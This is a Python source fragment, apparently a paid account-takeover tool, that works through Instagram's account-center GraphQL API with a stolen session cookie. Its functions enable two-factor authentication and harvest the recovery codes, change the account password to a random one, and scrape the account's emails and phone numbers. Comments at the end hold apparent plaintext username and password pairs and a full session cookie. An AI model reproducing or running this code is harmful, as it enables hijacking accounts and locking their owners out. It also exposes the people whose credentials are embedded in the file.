           xxx, ua = resp, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
           head = self.headers_graph(resp)
           head.update({
              'Host': 'accountscenter.instagram.com',
              'x-ig-app-id': '936619743392459',
              'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
              'content-type': 'application/x-www-form-urlencoded',
              'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
           })
           data = {'av':self.AccountId(resp),'__user':'0','__a':'1','__req':'14','__hs':re.search('"haste_session":"(.*?)"', str(xxx)).group(1),'dpr':'2','__ccg':'GOOD','__rev':re.search('{"rev":(.*?)}',str(xxx)).group(1),'__hsi':re.findall('"hsi":"(\d+)"',str(xxx))[0],'__comet_req':'24','fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),'jazoest':re.findall('&jazoest=(\d+)',str(xxx))[0],'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),'__spin_r':re.findall('"__spin_r":(\d+)', str(xxx))[0],'__spin_b':'trunk','__spin_t':re.findall('"__spin_t":(\d+)', str(xxx))[0],'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useFXSettingsTwoFactorEnableTOTPMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","verification_code":code,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),'server_timestamps':'true','doc_id':'7032881846733167'}
           ondw = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
           if '"success":true' in str(ondw):
              self.info.update({'success-a2f':True})
              reco = self.get_code(cokie, resp)
              if reco is not None:
                 try:
                     kode = reco['data']['xfb_two_factor_regenerate_recovery_codes']['recovery_codes']
                     self.info.update({'kode-pemulihan':kode})
                 except:
                     self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
              else:self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
           else:
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak ada'})

   def get_code(self, cokie, response):
       try:
           data = self.data_graph(response)
           clin = self.ClientId(response)
           user = data['av']
           data.update({'__req':'t','__s':'','__dyn':'','__csr':'','fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':'{"input":{"client_mutation_id":"'+clin+'","actor_id":"'+user+'","account_id":"'+user+'","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}','doc_id':'24010978991879298'})
           head = self.headers_graph(response)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'sec-ch-ua': 'Not_A',
               'x-ig-app-id': '936619743392459',
               'sec-ch-ua-mobile': '?0',
               'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
               'viewport-width': '980',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation',
               'x-fb-lsd': '7g42wKUg5uJbzrClbnTyuB',
               'content-type': 'application/x-www-form-urlencoded',
               'x-asbd-id': '129477',
               'dpr': '2',
               'sec-ch-ua-full-version-list': 'Not_A',
               'sec-ch-prefers-color-scheme': 'light',
               'sec-ch-ua-platform': 'Linux',
               'accept': '*/*',
               'origin': 'https://accountscenter.instagram.com',
               'sec-fetch-site': 'same-origin',
               'sec-fetch-mode': 'cors',
               'sec-fetch-dest': 'empty',
               'referer': 'https://accountscenter.instagram.com/password_and_security/two_factor/',
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',})
           reqs = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cokie}, data=data, headers=head).json()
           return reqs
       except Exception as e:
           return None

   def RePassword(self, cookie, paswd):
        try:
            abcd = 'abcdefghijklmnopqrstuvwxyz'
            acak = ''.join(random.choice(abcd) for _ in range(8))
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 191.0.0.25.122 (iPhone13,1; iOS 14_4_2; en_CA; en-CA; scale=2.88; 1080x2338; 296543649) NW/3'})
            data = self.data_graph(resp)
            pw_old = '#PWD_BROWSER:0:{}:{}'.format(int(time.time()), paswd)
            new_pw = '#PWD_BROWSER:0:{}:{}'.format(int(time.time()), acak)
            data.update({
               'fb_api_req_friendly_name':'useFXSettingsChangePasswordMutation',
               'variables':json.dumps({"account_id":self.AccountId(resp),"account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":pw_old},"new_password_enc":{"sensitive_string_value":new_pw},"new_password_confirm_enc":{"sensitive_string_value":new_pw},"client_mutation_id":self.ClientId(resp)}),
               'doc_id':'4872350656193366'
            })
            xnxx = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cookie}).text
            if '"success":true' in str(xnxx):
               return new_pw.split(':')[3]
            else:
               return None
        except Exception as e:return None

   def AccountId(self, xxx):
       try:
           Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
           return(Userid)
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

   def ClientId(self, xxx):
       try:
           Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
           return Clients
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

   def InfoKontak(self, cokie):
       self.mail = []
       self.numb = []
       self.r = bsp(requests.get('https://accountscenter.instagram.com/personal_info/contact_points/', cookies={'cookie':cokie}).text,'html.parser')
       for self.x in self.r.find_all('script'):
           if 'contact_point_type' in str(self.x.text):
              self.nomor = re.findall('{"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)",', str(self.x.text))
              if len(self.nomor) > 0:
                 for self.p in self.nomor:
                     if self.p not in self.numb:
                        self.numb.append(self.p)
              self.email = re.findall('{"contact_point_type":"EMAIL","normalized_contact_point":"(.*?)"', str(self.x.text))
              if len(self.email) > 0:
                 for self.z in self.email:
                     self.c = urllib.parse.unquote(self.z)
                     print(self.c)

   def konfirkeys(self):
       if os.path.isfile('data/.keys.txt') is True:
          self.keys   = open('data/.keys.txt','r').read()
          self.token  = 'WyI3MjcxNzUyNyIsIlBYK1JhRlRicHloLzdyeGYrMXdYemRMd3IzRy8xY3ZqbW9nMEdaQzQiXQ=='
          self.produk = '23685'
          try:
              data = {
                 'token': self.token,
                 'ProductId': self.produk,
                 'Key': self.keys
              }
              link = requests.get('https://api.cryptolens.io/api/key/Activate', params=data).json()
              print(link)
              expd = link["licenseKey"]["expires"][:10]
              tahun,bulan,tanggal = expd.split("-")
              date = "%s%s%s"%(int(tanggal),int(bulan),int(tahun))
              neww = "%s%s%s"%(hari,buln,thun)
              form = "%d%m%Y"
              tess = datetime.datetime.strptime(date,form)
              mekk = datetime.datetime.strptime(neww,form)
              xnxx = tess - mekk
              sisa = xnxx.days
              open('data/.keys.txt','w').write(f'{self.keys}')
              if len(self.keys) == 23 and '-' in str(self.keys):
                 return 1
              else:
                 os.remove('data/.keys.txt')
                 exit(f'\n{P}[{M}!{P}] License not found: {self.keys}')
          except (KeyError):
              os.remove('data/.keys.txt')
              exit(f'\n{P}[{M}!{P}] License Anda Tidak Valid')
          except FileNotFoundError:
              exit(f'\n{P}[{M}!{P}] Ss Error ini Kirim Ke Author!')
       else:
            print(f'\n{P}[{K2}!{P}] Masukan License Anda')
            self.cx = input(f'{P}[{H}?{P}] Masukan License : ')
            open('data/.keys.txt','w').write(f'{self.cx}')
            exit(f'\n{P}[{H}!{P}] Jalankan ulang : python {sys.argv[0]}')

   def memek(self, key):
       try:
           self.dv = requests.get("https://pastebin.com/raw/kD0uyEWv").json()['users']
           for self.xy in self.dv:
               if key in str(self.xy):
                  if self.xy[key] == platform.platform():
                     return True
                  else:
                     exit(f'{P}[{K}!{P}] Ups, Sepertinya license anda sudah di pake di device lain!, Note Jangan Share License Anda Kepada Orang Lain')
               else:
                  print(f'\n{P}[{K}!{P}] License tidak tersedia di dalam web kami, jika menurut anda ini keliru silakan hubungi author!')
                  exit(1)
       except Exception as e:
           exit(f'{P}[{K}!{P}] Kesalahan tak terduga : {e}')

#MAIN().ApiOLD('sandidjafar22',['black12345'])
#'tegarrisqiono',['tegar1234'])
#.InfoKontak('ig_did=B10F1D03-ECED-4E9E-83E2-063731ED1905;datr=TFeUZfS23mCrjokyJy9LYepa;mid=ZZRXaAABAAEWtH6ew9T-AqwU7Ur9;ig_nrcb=1;fbm_124024574287414=base_domain=.instagram.com;shbid="15398\05463533983993\0541737659829:01f76f660b72c2f96d4452e24d7cb700ababae6c68ea4156619ba2a8cf3ee09d0a48de08";shbts="1706123829\05463533983993\0541737659829:01f7dec3af198fb65e5ece4f5793b68764a823ca98dff0f84e6a9de163747403c6f0f06d";ps_n=0;ps_l=0;csrftoken=qJsUUbUa0Lly7hKvRCT4CZT7fPm81qmY;ds_user_id=49590246702;sessionid=49590246702%3A9BSB9nGZOHKqVH%3A7%3AAYeCBkRQpfanObkRSyWRvD6dXDaxB5VrAdugE1sVng;rur="EAG\05449590246702\0541737900198:01f7da084a581de356a045b7409061c229756fa82c8021b96bc032f25fec61bdfe1f333f"')
#ApiOLD('sandidjafar22',['black12345'])
#x=requests.get('https://www.instagram.com/fxcal/reauth_login/?app_id=1217981644879628&etoken=&next=https%3A%2F%2Faccountscenter.instagram.com%2Fpersonal_info%2Fcontact_points%2F%3Fcontact_point_type%3Dphone_number%26contact_point_value%3D%252B6283134926053%26dialog_type%3Dcontact_detail%26auth_flow%3Dreauth').text
#open('cek.js','w').write(f'{x}')
